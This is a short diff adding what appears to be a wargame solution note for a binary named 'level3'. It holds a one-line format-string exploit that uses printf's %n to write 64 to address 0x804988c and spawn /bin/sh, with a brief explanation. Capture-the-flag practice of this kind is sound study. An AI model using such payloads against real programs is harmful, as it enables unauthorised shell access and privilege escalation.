@@ -1,0 +1,7 @@
+(python -c "print('\x8c\x98\x04\x08' + 'x'*64 + '%n')" ;cat) | ./level3
+
+
+We need that 0x804988c equal 0x40 (64) to exec system("/bin/sh")
+So with printf %n flag, we write 64 characters to this address.
+
+\x8c\x98\x04\x08: Address we need to overwrite
